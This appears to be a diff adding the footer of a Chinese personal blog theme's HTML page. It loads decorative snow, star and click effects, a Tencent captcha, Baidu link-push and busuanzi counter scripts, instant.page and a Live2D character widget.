+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
